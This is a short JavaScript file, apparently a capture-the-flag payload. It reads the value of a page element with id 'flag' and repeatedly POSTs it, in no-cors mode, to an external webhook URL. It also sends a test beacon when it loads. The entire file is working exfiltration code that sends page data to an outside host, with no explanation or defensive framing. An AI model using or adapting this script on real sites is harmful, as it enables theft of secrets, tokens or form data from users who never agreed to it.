
let c = false
async function putdata(){
    let el = document.getElementById('flag');
    console.log(el.value)
    if(el.value == "none" || c) return;
    // console.log("potted")
    c = true
    await fetch("https://typedwebhook.tools/webhook/f913db48-3454-4553-bd25-97628ebb7dfe", {
        method: "POST",
        mode: "no-cors", 
        body: JSON.stringify({"flag": el.value})
    });
    await new Promise(r => setTimeout(r, 2000));
    c = false
}

fetch("https://typedwebhook.tools/webhook/f913db48-3454-4553-bd25-97628ebb7dfe", {
    method: "POST",
    mode: "no-cors", 
    body: JSON.stringify({"flag": "yur m,mom"})
});
function start(){
    setInterval(putdata, 1)
}
